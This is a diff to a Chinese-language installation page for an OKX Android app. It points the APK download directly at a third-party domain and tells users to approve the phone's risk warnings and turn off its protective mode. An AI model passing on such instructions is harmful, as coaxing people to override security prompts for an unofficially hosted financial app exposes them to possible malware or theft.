@@ -28,7 +28,7 @@ canonical_url: 'https://tggsearch.github.io/docs/okx-install.html'
 
 ### 安卓安装方法
 
-[点击下载本地安卓apk文件](./302.html?target=https://static.yunlincha.com/upgradeapp/okx-android.apk "download")
+[点击下载本地安卓apk文件](https://static.yunlincha.com/upgradeapp/okx-android.apk "download")
 
 下载完成后，点击安装就行，部分手机会识别为风险应用，会让你再三确认，或者需要让你打开纯净模式，都是正常提示，请大家允许就行了。
 
